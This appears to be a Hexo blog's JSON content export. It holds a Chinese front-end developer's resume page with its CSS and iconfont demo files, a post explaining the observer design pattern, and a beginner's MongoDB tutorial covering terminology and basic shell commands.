{"meta":{"title":"houfee's Blog","subtitle":"写我所想","description":"life and learn","author":"houfee","url":"http://yoursite.com"},"pages":[{"title":"Categoriescloud","date":"2017-04-26T09:47:43.000Z","updated":"2020-06-18T07:09:21.445Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-06-18T07:09:21.448Z","updated":"2020-06-18T07:09:21.448Z","comments":false,"path":"hireme/index.html","permalink":"http://yoursite.com/hireme/index.html","excerpt":"","text":"我的简历 姓名： 侯飞 年龄： 25 籍贯： 河北张家口 学历： 本科 毕业院校： 唐山学院 毕业时间： 2017-07 手机号： 13261351763 邮箱： allen1710@163.com 工作经验: 3年 应聘职位： web前端工程师 职业技能 具有三年 Web 开发经验，熟练掌握H5、C3，能够基于scss等拓展语言快速开发，构建出高性 能并且兼容性好的Web应用 具有扎实的JS基础，并且熟练掌握ES6新语法 熟练掌握 Vue、Vue Router、Vuex等相关技术栈，能够根据业务需求封装特定组件 熟练掌握Hybird APP开发，对移动端适配和JS与原生交互有一定研究 掌握React、Redux，能够基于antd快速开发后台管理系统，有RN开发经验 熟练掌握Webpack、Babel和PostCSS，会配置常用的loader和plugin，能够快速构建工程 基本熟悉Node，会用Node编写提高工作效率的脚本，会使用Express进行接口开发 熟练掌握ESlint配置，并在项目中使用，统一编码规范 熟练掌握Git和SVN等版本控制工具的使用 工作经历 2018.9-至今 中科软科技（web前端工程师） 2019.6 – 至今 参与APP独立小应用的开发； 2019.3 – 2019.5 负责牙牙预约H5页面的开发工作，并配合后台完成系统升级； 2018.9 – 2019.2 负责Hybrid App 开发，负责预约功能、视频播放、大图预览等模块开发 2018.8 - 2017.7 北京橙悦科技有限公司（web前端工程师） 2018.2 – 2018.8 参与摄影器材租赁系统后端管理平台开发工作；负责公司首页开发的开发工作，以及公众号的开发。 2017.8 – 2018.1 负责公司首页开发的开发工作，以及公众号的开发。 练手项目 2020.2 – 至今&nbsp;&nbsp;&nbsp;Vue移动端的组件库-lightui 项目描述：一个轻量级的vue移动端组件库 我的工作： 1、 升级vue-cli2依赖包，包括babel、webpack以及其他loader 2、 参考cube-ui的打包模式，依赖一套package，构建生成组件模块、 example和 文档网址 3、 参考element-ui的scss设计思想，并在项目中使用 4、 将现有的vue组件库的优秀组件添加到lightui中。 2019.10 – 2020.1&nbsp;&nbsp;&nbsp;react后台管理项目 项目描述：后台管理项目，包括 用户登录、 首页、 商品管理、 用户管理以及 图形图标等模块 我的工作： 1、使用antd组件库搭建项目结构，完成该项目的用户管理，首页等多个模块的开发 2、通过jsonp方式请求第三方天气接口，为项目添加天气模块 3、使用echarts添加可视化图形模块，使用draftjs-to-html为项目添加富文本编辑器 4、使用redux进行状态管理 项目经验 APP小应用开发：2019.6 – 至今 项目描述：完成多个功能的小应用开发，包括预约、详情、评价、内容介绍等任务 我的工作： 1、改造vue-cli，使用postcss相关插件完成移动端的适配 2、根据业务需求完成公共组件，包括日历选择组件，时间颗粒度选择组件，证件弹框组件等 3、通过 vue-router 的生命周期钩子判断不同入口的页面返回以及跳转，并且在该页面销毁时将数 据保存在vuex中 4、通过 js 和原生交互，实现原生向页面注数据，以及 js 调取原生的相机、地图、电话等组件，并 且实现页面埋点，统计访问数据 5、配合产品完成页面功能改进，提升用户体检 牙牙预约：2019.3 - 2019.5 项目描述：牙牙预约为客户提供牙齿健康预约服务，进行Vue多页面开发，在不同平台有不同的样式风格，以及不同渠道的预约门店等不同 我的工作： 1、将老项目代码从SVN移植到GitLab；相似渠道代码归并，减少代码量 2、根据业务需求重构代码，便于用于新渠道开发 3、重写并替换项目冗余组件，便于项目维护和移植 4、调用高德、腾讯等地图组件，实现定位功能 5、配合后端同事完成数据优化以及实现新需求 富通App：2018.9 – 2019.2 项目描述：富通App是一款供保险代理人使用，向代理人提供竞赛、预约、宣传、业绩查询、消 息接收等功能 我的工作： 1、根据UI提供的设计稿转换为适配移动端的H5页面 2、通过webview实现js与原生交互，让内嵌H5可以调用客户端的原生方法 3、在APP中，通过videojs实现视频播放，以及使用echarts实现数据可视化 4、开发前端通用的按钮组件、弹框组件和日历组件 5、webpack打包优化，以及后期的性能优化等 IPF摄影器材租赁系统：2018.1 – 2018.8 项目描述：IPF摄影器材租赁系统是一款后端管理平台，向用户租赁各种摄影器材，主要包括登录、商品管理、用户管理、订单管理等。 我的工作： 1、负责web产品页面制作，根据产品需求，制定管理系统的UI风格，实现用户交互的效果； 2、持续优化前端体验和页面响应速度，提升web界面友好易用； 3、与产品经理、UI设计师及开发经理沟通，理解需求，进行敏捷开发、持续交付和验证； 4、完成一些推广的H5页面，如活动介绍，公司月报总结等； 5、帮助其他同事进行部分页面的调试，负责后期的性能优化。 自我评价 本人性格开朗，有良好的沟通能力和团队协作精神，具有良好的业务理解能力，能够独立解决工作中遇到的问题； 热爱编程，喜欢专研新技术，不断突破技术瓶颈，遇到问题一查到底，乐于记笔记、写博客； 喜欢前端，热爱互联网行业，关注前沿技术，能够保持不断学习的决心和动力。"},{"title":"Tagcloud","date":"2017-04-26T09:47:43.000Z","updated":"2020-06-18T07:09:21.448Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-06-18T07:09:21.445Z","updated":"2020-06-18T07:09:21.445Z","comments":true,"path":"hireme/css/index.css","permalink":"http://yoursite.com/hireme/css/index.css","excerpt":"","text":"body { background-color: #eeeeee; padding-top: 50px; margin: 20px 0; padding: 0; } p { margin: 0; padding: 0; } /* 导航栏 */ .res-navbar { border: none; margin-bottom: 10px; border-bottom: 1px solid #777777; } .res-navbar .navbar-brand { margin-top: 5px; color: #777; } .res-navbar .navbar-brand .icon-zhaopin { font-size: 48px; color: #6ac6db; } .res-navbar .navbar-brand:hover, .res-navbar .navbar-brand:focus { color: #5e5e5e; background-color: transparent; } .res-navbar .navbar-text { color: #777; } .res-navbar .navbar-nav > li > a { color: #777; height: 40px; line-height: 27px; padding: 5px 15px; } .res-navbar .navbar-nav > li > a:hover, .res-navbar .navbar-nav > li > a:focus { color: #333; background-color: transparent; border-bottom: 3px solid #6ac6db; } .res-navbar .navbar-nav > .active > a, .res-navbar .navbar-nav > .active > a:hover, .res-navbar .navbar-nav > .active > a:focus { color: #555; background-color: transparent; border-bottom: 3px solid #6ac6db; } .res-navbar .navbar-nav > .disabled > a, .res-navbar .navbar-nav > .disabled > a:hover, .res-navbar .navbar-nav > .disabled > a:focus { color: #ccc; background-color: transparent; } .res-navbar .navbar-toggle { border-color: #ddd; margin-top: 18px; } .res-navbar .navbar-toggle:hover, .res-navbar .navbar-toggle:focus { background-color: #ddd; } .res-navbar .navbar-toggle .icon-bar { background-color: #888; } .res-navbar .navbar-collapse, .res-navbar .navbar-form { border-color: #e7e7e7; } .res-navbar .navbar-nav > .open > a, .res-navbar .navbar-nav > .open > a:hover, .res-navbar .navbar-nav > .open > a:focus { color: #555; background-color: #e7e7e7; } @media (max-width: 767px) { .res-navbar .navbar-nav .open .dropdown-menu > li > a { color: #777; } .res-navbar .navbar-nav .open .dropdown-menu > li > a:hover, .res-navbar .navbar-nav .open .dropdown-menu > li > a:focus { color: #333; background-color: transparent; } .res-navbar .navbar-nav .open .dropdown-menu > .active > a, .res-navbar .navbar-nav .open .dropdown-menu > .active > a:hover, .res-navbar .navbar-nav .open .dropdown-menu > .active > a:focus { color: #555; background-color: #e7e7e7; } .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a, .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:hover, .res-navbar .navbar-nav .open .dropdown-menu > .disabled > a:focus { color: #ccc; background-color: transparent; } } .res-navbar .navbar-link { color: #777; } .res-navbar .navbar-link:hover { color: #333; } .res-navbar .btn-link { color: #777; } .res-navbar .btn-link:hover, .res-navbar .btn-link:focus { color: #333; } .res-navbar .btn-link[disabled]:hover, fieldset[disabled] .res-navbar .btn-link:hover, .res-navbar .btn-link[disabled]:focus, fieldset[disabled] .res-navbar .btn-link:focus { color: #ccc; } /* 个人介绍 */ .res-introduce { padding: 10px 0; border: 1px solid #6ac6db; box-shadow: inset 0px 0px 10px 0px #6ac6db; border-radius: 5px; } .res-introduce .row { color: #333333; } .res-introduce .row:first-child { padding: 0; } .res-introduce .row:first-child .avatar-box .my-avatar { display: block; margin: 0 auto; height: 160px; } .res-introduce .my-info .row { height: 32px; line-height: 32px; margin: 2px 0; } /* 技能区域 & 自我评价 */ .res-skill { margin-top: 10px; padding: 5px 0; border: 1px solid #6ac6db; border-radius: 5px; box-shadow: inset 0px 0px 10px 0px #6ac6db; } .res-skill .row:first-child { height: 32px; line-height: 32px; font-size: 18px; } .res-skill .row:first-child .glyphicon-tag { padding-left: 5px; color: #6bc4d9; } .res-skill .row { padding: 5px; } .res-skill .row .glyphicon-hand-right { margin-left: 10px; color: #6bc4d9; } .res-skill .row .items { color: #333333; letter-spacing: 1px; font-weight: 600; padding-left: 5px; } .res-skill .row .values { padding: 5px 0; color: #222222; } /* 工作经历 项目经验 */ .res-company { margin-top: 10px; padding: 5px 0; border: 1px solid #6ac6db; border-radius: 5px; box-shadow: inset 0px 0px 10px 0px #6ac6db; } .res-company .sub-title { height: 32px; line-height: 32px; font-size: 18px; } .res-company .sub-title .glyphicon-tag { padding-left: 5px; color: #6bc4d9; } .res-company .row { padding: 3px 5px; } .res-company .row .glyphicon-time, .res-company .row .glyphicon-lock, .res-company .row .glyphicon-saved { margin-left: 10px; color: #6bc4d9; } .res-company .row .items { color: #333333; letter-spacing: 1px; font-weight: 600; } .res-company .row .values { padding: 2px 0px 2px 15px; color: #222222; } .footer { margin-bottom: 20px; }"},{"title":"","date":"2020-06-18T07:09:21.446Z","updated":"2020-06-18T07:09:21.446Z","comments":true,"path":"hireme/fonts/iconfont/demo.css","permalink":"http://yoursite.com/hireme/fonts/iconfont/demo.css","excerpt":"","text":"/* Logo 字体 */ @font-face { font-family: \"iconfont logo\"; src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834'); src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834#iefix') format('embedded-opentype'), url('https://at.alicdn.com/t/font_985780_km7mi63cihi.woff?t=1545807318834') format('woff'), url('https://at.alicdn.com/t/font_985780_km7mi63cihi.ttf?t=1545807318834') format('truetype'), url('https://at.alicdn.com/t/font_985780_km7mi63cihi.svg?t=1545807318834#iconfont') format('svg'); } .logo { font-family: \"iconfont logo\"; font-size: 160px; font-style: normal; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; } /* tabs */ .nav-tabs { position: relative; } .nav-tabs .nav-more { position: absolute; right: 0; bottom: 0; height: 42px; line-height: 42px; color: #666; } #tabs { border-bottom: 1px solid #eee; } #tabs li { cursor: pointer; width: 100px; height: 40px; line-height: 40px; text-align: center; font-size: 16px; border-bottom: 2px solid transparent; position: relative; z-index: 1; margin-bottom: -1px; color: #666; } #tabs .active { border-bottom-color: #f00; color: #222; } .tab-container .content { display: none; } /* 页面布局 */ .main { padding: 30px 100px; width: 960px; margin: 0 auto; } .main .logo { color: #333; text-align: left; margin-bottom: 30px; line-height: 1; height: 110px; margin-top: -50px; overflow: hidden; *zoom: 1; } .main .logo a { font-size: 160px; color: #333; } .helps { margin-top: 40px; } .helps pre { padding: 20px; margin: 10px 0; border: solid 1px #e7e1cd; background-color: #fffdef; overflow: auto; } .icon_lists { width: 100% !important; overflow: hidden; *zoom: 1; } .icon_lists li { width: 100px; margin-bottom: 10px; margin-right: 20px; text-align: center; list-style: none !important; cursor: default; } .icon_lists li .code-name { line-height: 1.2; } .icon_lists .icon { display: block; height: 100px; line-height: 100px; font-size: 42px; margin: 10px auto; color: #333; -webkit-transition: font-size 0.25s linear, width 0.25s linear; -moz-transition: font-size 0.25s linear, width 0.25s linear; transition: font-size 0.25s linear, width 0.25s linear; } .icon_lists .icon:hover { font-size: 100px; } .icon_lists .svg-icon { /* 通过设置 font-size 来改变图标大小 */ width: 1em; /* 图标和文字相邻时，垂直对齐 */ vertical-align: -0.15em; /* 通过设置 color 来改变 SVG 的颜色/fill */ fill: currentColor; /* path 和 stroke 溢出 viewBox 部分在 IE 下会显示 normalize.css 中也包含这行 */ overflow: hidden; } .icon_lists li .name, .icon_lists li .code-name { color: #666; } /* markdown 样式 */ .markdown { color: #666; font-size: 14px; line-height: 1.8; } .highlight { line-height: 1.5; } .markdown img { vertical-align: middle; max-width: 100%; } .markdown h1 { color: #404040; font-weight: 500; line-height: 40px; margin-bottom: 24px; } .markdown h2, .markdown h3, .markdown h4, .markdown h5, .markdown h6 { color: #404040; margin: 1.6em 0 0.6em 0; font-weight: 500; clear: both; } .markdown h1 { font-size: 28px; } .markdown h2 { font-size: 22px; } .markdown h3 { font-size: 16px; } .markdown h4 { font-size: 14px; } .markdown h5 { font-size: 12px; } .markdown h6 { font-size: 12px; } .markdown hr { height: 1px; border: 0; background: #e9e9e9; margin: 16px 0; clear: both; } .markdown p { margin: 1em 0; } .markdown>p, .markdown>blockquote, .markdown>.highlight, .markdown>ol, .markdown>ul { width: 80%; } .markdown ul>li { list-style: circle; } .markdown>ul li, .markdown blockquote ul>li { margin-left: 20px; padding-left: 4px; } .markdown>ul li p, .markdown>ol li p { margin: 0.6em 0; } .markdown ol>li { list-style: decimal; } .markdown>ol li, .markdown blockquote ol>li { margin-left: 20px; padding-left: 4px; } .markdown code { margin: 0 3px; padding: 0 5px; background: #eee; border-radius: 3px; } .markdown strong, .markdown b { font-weight: 600; } .markdown>table { border-collapse: collapse; border-spacing: 0px; empty-cells: show; border: 1px solid #e9e9e9; width: 95%; margin-bottom: 24px; } .markdown>table th { white-space: nowrap; color: #333; font-weight: 600; } .markdown>table th, .markdown>table td { border: 1px solid #e9e9e9; padding: 8px 16px; text-align: left; } .markdown>table th { background: #F7F7F7; } .markdown blockquote { font-size: 90%; color: #999; border-left: 4px solid #e9e9e9; padding-left: 0.8em; margin: 1em 0; } .markdown blockquote p { margin: 0; } .markdown .anchor { opacity: 0; transition: opacity 0.3s ease; margin-left: 8px; } .markdown .waiting { color: #ccc; } .markdown h1:hover .anchor, .markdown h2:hover .anchor, .markdown h3:hover .anchor, .markdown h4:hover .anchor, .markdown h5:hover .anchor, .markdown h6:hover .anchor { opacity: 1; display: inline-block; } .markdown>br, .markdown>p>br { clear: both; } .hljs { display: block; background: white; padding: 0.5em; color: #333333; overflow-x: auto; } .hljs-comment, .hljs-meta { color: #969896; } .hljs-string, .hljs-variable, .hljs-template-variable, .hljs-strong, .hljs-emphasis, .hljs-quote { color: #df5000; } .hljs-keyword, .hljs-selector-tag, .hljs-type { color: #a71d5d; } .hljs-literal, .hljs-symbol, .hljs-bullet, .hljs-attribute { color: #0086b3; } .hljs-section, .hljs-name { color: #63a35c; } .hljs-tag { color: #333333; } .hljs-title, .hljs-attr, .hljs-selector-id, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo { color: #795da3; } .hljs-addition { color: #55a532; background-color: #eaffea; } .hljs-deletion { color: #bd2c00; background-color: #ffecec; } .hljs-link { text-decoration: underline; } /* 代码高亮 */ /* PrismJS 1.15.0 https://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */ /** * prism.js default theme for JavaScript, CSS and HTML * Based on dabblet (http://dabblet.com) * @author Lea Verou */ code[class*=\"language-\"], pre[class*=\"language-\"] { color: black; background: none; text-shadow: 0 1px white; font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace; text-align: left; white-space: pre; word-spacing: normal; word-break: normal; word-wrap: normal; line-height: 1.5; -moz-tab-size: 4; -o-tab-size: 4; tab-size: 4; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; } pre[class*=\"language-\"]::-moz-selection, pre[class*=\"language-\"] ::-moz-selection, code[class*=\"language-\"]::-moz-selection, code[class*=\"language-\"] ::-moz-selection { text-shadow: none; background: #b3d4fc; } pre[class*=\"language-\"]::selection, pre[class*=\"language-\"] ::selection, code[class*=\"language-\"]::selection, code[class*=\"language-\"] ::selection { text-shadow: none; background: #b3d4fc; } @media print { code[class*=\"language-\"], pre[class*=\"language-\"] { text-shadow: none; } } /* Code blocks */ pre[class*=\"language-\"] { padding: 1em; margin: .5em 0; overflow: auto; } :not(pre)>code[class*=\"language-\"], pre[class*=\"language-\"] { background: #f5f2f0; } /* Inline code */ :not(pre)>code[class*=\"language-\"] { padding: .1em; border-radius: .3em; white-space: normal; } .token.comment, .token.prolog, .token.doctype, .token.cdata { color: slategray; } .token.punctuation { color: #999; } .namespace { opacity: .7; } .token.property, .token.tag, .token.boolean, .token.number, .token.constant, .token.symbol, .token.deleted { color: #905; } .token.selector, .token.attr-name, .token.string, .token.char, .token.builtin, .token.inserted { color: #690; } .token.operator, .token.entity, .token.url, .language-css .token.string, .style .token.string { color: #9a6e3a; background: hsla(0, 0%, 100%, .5); } .token.atrule, .token.attr-value, .token.keyword { color: #07a; } .token.function, .token.class-name { color: #DD4A68; } .token.regex, .token.important, .token.variable { color: #e90; } .token.important, .token.bold { font-weight: bold; } .token.italic { font-style: italic; } .token.entity { cursor: help; }"},{"title":"","date":"2020-06-18T07:09:21.446Z","updated":"2020-06-18T07:09:21.446Z","comments":true,"path":"hireme/fonts/iconfont/demo_index.html","permalink":"http://yoursite.com/hireme/fonts/iconfont/demo_index.html","excerpt":"","text":"IconFont Demo &#xe86b; Unicode Font class Symbol &#xe688; 招聘 &amp;#xe688; Unicode 引用 Unicode 是字体在网页端最原始的应用方式，特点是： 兼容性最好，支持 IE6+，及所有现代浏览器。 支持按字体的方式去动态调整图标大小，颜色等等。 但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。 注意：新版 iconfont 支持多色图标，这些多色图标在 Unicode 模式下将不能使用，如果有需求建议使用symbol 的引用方式 Unicode 使用步骤如下： 第一步：拷贝项目下面生成的 @font-face @font-face { font-family: 'iconfont'; src: url('iconfont.eot'); src: url('iconfont.eot?#iefix') format('embedded-opentype'), url('iconfont.woff2') format('woff2'), url('iconfont.woff') format('woff'), url('iconfont.ttf') format('truetype'), url('iconfont.svg#iconfont') format('svg'); } 第二步：定义使用 iconfont 的样式 .iconfont { font-family: \"iconfont\" !important; font-size: 16px; font-style: normal; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; } 第三步：挑选相应图标并获取字体编码，应用于页面 &lt;span class=\"iconfont\"&gt;&amp;#x33;&lt;/span&gt; \"iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。 招聘 .icon-zhaopin font-class 引用 font-class 是 Unicode 使用方式的一种变种，主要是解决 Unicode 书写不直观，语意不明确的问题。 与 Unicode 使用方式相比，具有如下特点： 兼容性良好，支持 IE8+，及所有现代浏览器。 相比于 Unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。 因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 Unicode 引用。 不过因为本质上还是使用的字体，所以多色图标还是不支持的。 使用步骤如下： 第一步：引入项目下面生成的 fontclass 代码： &lt;link rel=\"stylesheet\" href=\"./iconfont.css\"&gt; 第二步：挑选相应图标并获取类名，应用于页面： &lt;span class=\"iconfont icon-xxx\"&gt;&lt;/span&gt; \" iconfont\" 是你项目下的 font-family。可以通过编辑项目查看，默认是 \"iconfont\"。 招聘 #icon-zhaopin Symbol 引用 这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 SVG 的集合，与另外两种相比具有如下特点： 支持多色图标了，不再受单色限制。 通过一些技巧，支持像字体那样，通过 font-size, color 来调整样式。 兼容性较差，支持 IE9+，及现代浏览器。 浏览器渲染 SVG 的性能一般，还不如 png。 使用步骤如下： 第一步：引入项目下面生成的 symbol 代码： &lt;script src=\"./iconfont.js\"&gt;&lt;/script&gt; 第二步：加入通用 CSS 代码（引入一次就行）： &lt;style&gt; .icon { width: 1em; height: 1em; vertical-align: -0.15em; fill: currentColor; overflow: hidden; } &lt;/style&gt; 第三步：挑选相应图标并获取类名，应用于页面： &lt;svg class=\"icon\" aria-hidden=\"true\"&gt; &lt;use xlink:href=\"#icon-xxx\"&gt;&lt;/use&gt; &lt;/svg&gt; $(document).ready(function () { $('.tab-container .content:first').show() $('#tabs li').click(function (e) { var tabContent = $('.tab-container .content') var index = $(this).index() if ($(this).hasClass('active')) { return } else { $('#tabs li').removeClass('active') $(this).addClass('active') tabContent.hide().eq(index).fadeIn() } }) })"},{"title":"","date":"2020-06-18T07:09:21.446Z","updated":"2020-06-18T07:09:21.446Z","comments":true,"path":"hireme/fonts/iconfont/iconfont.css","permalink":"http://yoursite.com/hireme/fonts/iconfont/iconfont.css","excerpt":"","text":"@font-face {font-family: \"iconfont\"; src: url('iconfont.eot?t=1551757320444'); /* IE9 */ src: url('iconfont.eot?t=1551757320444#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('data:application/x-font-woff2;charset=utf-8;base64,d09GMgABAAAAAAOMAAsAAAAAB2wAAAM/AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHEIGVgCCcAqCdIJPATYCJAMICwYABCAFhG0HMRt2BsiOwnGvhHIx+f8VPJCd35tkgz/7KXSSj5VVwazYqbrrXMm5WrpNqS7CbWqVUa2qqr/tfWubBMYzHpRBKYQE4fB5rql3C/H8QHOMSotqG+CEAqwTR+vnA9lABuYbxi5oicchAIknPRL5hacr5FEwxwlADPbpMuQzOpSGdIERgb5iqSLERnQYNas0jwE2BN8XH5kII2jQaTGzSrvXGszerLSitMtMy2j0CPjTWQC2CrRAOIACorLSVkwqCoSTQqqBNL7AttIFvFlpMnm8zf7xQIDQY6aaA+AOedfEdwSXmq8BQAHWkTmAnYNeCNJdb21triiW1roFWb1DLD+2+gjLHFrlgRs07rqp2qy57day+1b7tjVOVZZTW7dK69XbRcvyHaU9tpFvufUItduOprY57tSw/diorJGVskGtVGvUKumYvaRXYLngXSk9xf100hqH8O1VW5F7Ci57JZyRz2te1DyrfOCt7k/3TYn6+MPBaL8reJe90eHCj+iNvq7hYWaur9W1YuYXbjv3+pD7oYevNr3u080aWg0r9eFhhhX6Wmeq4dWfO9YW4U/NhYViIcz94LsStiLYbmyl/VhQn6bt4Eq7weChKcjrSlB54D3I6fk6bN0SiFcCygvKpfc+K5/lOKS3dlV8fup+XtSYUuvspbpUo2h2mT8b6YIZAJg2KWiH/8pvMIw+y2qxSv9mVBUAXh6wMQaCbg7AeO52Af+gnSIAFC40AxoFaKgUgIY5ivcmk4nRBHbZ8jdU5XDDEYERh9t2GPBIoMWIP6nQw6FDJR56jGRBEsZ2tYodESmEYgaE8gEgsOYbGiy5DS3W/JAK/Rc6HPmHHmuhhaRa2G2pEij6ZN44yUwaKnNodviesI1cDNPPpD8cOUoLA8adoth04zgyOh/ekkfRFDPiaX3CkwLFuO/iBpxGjuNjMO5bpPLAmORgOozqrrrQQB1xoUgeEYQMQ2ggCu8gJio+HsJrzRQLnz9D6DxwkIka6qrcd4iIGLN7ZMyAUQdyK/M61d3KOTFPdCYwjAARRPi4IBswiHBw8EGC6kEWhAozwBjgC5gytJqJrrLB8gr37Sp4iQ1MtUZYfbUY5ntlPzA9AAA=') format('woff2'), url('iconfont.woff?t=1551757320444') format('woff'), url('iconfont.ttf?t=1551757320444') format('truetype'), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */ url('iconfont.svg?t=1551757320444#iconfont') format('svg'); /* iOS 4.1- */ } .iconfont { font-family: \"iconfont\" !important; font-size: 16px; font-style: normal; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; } .icon-zhaopin:before { content: \"\\e688\"; }"},{"title":"","date":"2020-06-18T07:09:21.447Z","updated":"2020-06-18T07:09:21.447Z","comments":true,"path":"hireme/fonts/iconfont/iconfont.js","permalink":"http://yoursite.com/hireme/fonts/iconfont/iconfont.js","excerpt":"","text":"!function(d){var e,l='',t=(e=document.getElementsByTagName(\"script\"))[e.length-1].getAttribute(\"data-injectcss\");if(t&&!d.__iconfont__svg__cssinject__){d.__iconfont__svg__cssinject__=!0;try{document.write(\".svgfont {display: inline-block;width: 1em;height: 1em;fill: currentColor;vertical-align: -0.1em;font-size:16px;}\")}catch(e){console&&console.log(e)}}!function(e){if(document.addEventListener)if(~[\"complete\",\"loaded\",\"interactive\"].indexOf(document.readyState))setTimeout(e,0);else{var t=function(){document.removeEventListener(\"DOMContentLoaded\",t,!1),e()};document.addEventListener(\"DOMContentLoaded\",t,!1)}else document.attachEvent&&(n=e,c=d.document,o=!1,i=function(){o||(o=!0,n())},(l=function(){try{c.documentElement.doScroll(\"left\")}catch(e){return void setTimeout(l,50)}i()})(),c.onreadystatechange=function(){\"complete\"==c.readyState&&(c.onreadystatechange=null,i())});var n,c,o,i,l}(function(){var e,t,n,c,o,i;(e=document.createElement(\"div\")).innerHTML=l,l=null,(t=e.getElementsByTagName(\"svg\")[0])&&(t.setAttribute(\"aria-hidden\",\"true\"),t.style.position=\"absolute\",t.style.width=0,t.style.height=0,t.style.overflow=\"hidden\",n=t,(c=document.body).firstChild?(o=n,(i=c.firstChild).parentNode.insertBefore(o,i)):c.appendChild(n))})}(window);"}],"posts":[{"title":"观察者模式","slug":"观察者模式","date":"2020-07-14T09:49:06.201Z","updated":"2020-07-14T09:49:06.201Z","comments":true,"path":"posts/9a246216.html","link":"","permalink":"http://yoursite.com/posts/9a246216.html","excerpt":"","text":"Observer(观察者)模式参考： 《JavaScript设计模式》 P42 人人都会设计模式：观察者模式–Observer 原生JavaScript实现观察者模式 JS 观察者模式 观察者模式 什么观察者模式第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。 首先看一下概念： 一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。 当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据） 当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。 怎么理解呢？我这里做一个比喻： 将称为subject的被观察者对象视为老师；将一系列观察者视为学生。 当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知； 老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者； 老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。 好了通俗易懂的理解就到这里，现在看看书上的概念： Subject(目标，被观察者)： 维护一系列观察者，方便添加或删除观察者。 Observer(观察者)： 为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。 ConcreateSubject(具体目标)： 状态发生改变时，向 Observer 发出通知，储存 ConcreateSubject 的状态。 ConcreteObserver(具体观察者)： 储存一个指向 ConcreateSubject 的引用，实现 Observer 的更新接口，以使自身状态与目标的状态保持一致。 那么再说一说常见的观察者模式的例子： 在前端业务中，浏览器的事件也是观察者模式123div.onclick = function click() &#123; alert('这就是一个简单的观察者事件')&#125; div 的 click 事件是被观察者 function click是观察者 function click 订阅 div click 事件，事件发生时，对应的动作就是 alert()","categories":[{"name":"设计模式","slug":"设计模式","permalink":"http://yoursite.com/categories/设计模式/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://yoursite.com/tags/设计模式/"}]},{"title":"moogoDB入门一","slug":"moogoDB入门一","date":"2020-07-08T10:25:03.000Z","updated":"2020-07-14T09:49:06.200Z","comments":true,"path":"posts/24755.html","link":"","permalink":"http://yoursite.com/posts/24755.html","excerpt":"","text":"1.MONGODB入门篇 2.centos安装mongodb 4.x及配置用户名密码（官方推荐的方式） 3.MONGODB手册 4.Express 教程 3：使用数据库 (Mongoose) 5.菜鸟教程 基本概念NoSQLNoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。 NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。 NoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。 基本术语 SQL术语/概念 MongoDB术语/概念 解释/说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 数据字段/域 index index 索引 table joins 表连接,MongoDB不支持 primary key primary key 主键,MongoDB自动将_id字段设置为主键 数据库一个mongodb中可以建立多个数据库。 数据库命名规范： 不能是空字符串（””)。 不得含有’ ‘（空格)、.、$、/、\\和\\0 (空字符)。 应全部小写。 最多64字节。 数据库保留字：admin、local、config 文档RDBMS 与 MongoDB 对应的术语： RDBMS MongoDB 数据库 数据库 表格 集合 行 文档 列 字段 表联合 嵌入文档 主键 主键 (MongoDB 提供了 key 为 _id ) 数据库基本操作 MongoDB连接 123mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]# mongodb://admin:123456@localhost/test CRUD1234567# 展示数据库show dbs# 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）use mydb# 向mydb的mycol集合中插入一条数据db.mycol.insert(&#123;\"name\": \"houfei\"&#125;)# MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。 创建/删除集合 db.createCollection(name, options) 12345678910111213# 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）use mydb# 创建mycol集合db.createCollection(\"mycol\")# 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。db.mycol.insert(&#123;\"name\": \"houfei\"&#125;)# 进入数据库use mydb# 查看已存在的集合show collections# 删除集合 mycoldb.mycol.drop() 